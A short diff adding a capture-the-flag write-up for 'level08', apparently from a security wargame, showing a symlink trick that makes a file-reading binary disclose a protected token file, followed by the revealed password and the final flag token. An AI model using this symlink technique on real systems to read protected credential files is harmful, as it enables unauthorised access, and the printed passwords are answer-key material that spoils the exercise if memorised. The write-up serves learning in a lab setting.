@@ -1,0 +1,24 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗          ██████╗  █████╗ 
+██║     ██╔════╝██║   ██║██╔════╝██║         ██╔═████╗██╔══██╗
+██║     █████╗  ██║   ██║█████╗  ██║         ██║██╔██║╚█████╔╝
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║         ████╔╝██║██╔══██╗
+███████╗███████╗ ╚████╔╝ ███████╗███████╗    ╚██████╔╝╚█████╔╝
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝     ╚═════╝  ╚════╝ 
+
+The executable read and display the content of a file.
+Unfortunately, we have no rights on token file.
+Let's try a Symlink Exploit.
+
+ln -s ~/token /tmp/file
+
+./level08 /tmp/file
+
+su flag08
+
+-> quif5eloekouj29ke0vouxean
+
+su flag08
+                                |═══════════════════════════|
+Check flag.Here is your token : | 25749xKZ8L7DkSCwJkT9dyv6f |
+                                |═══════════════════════════|
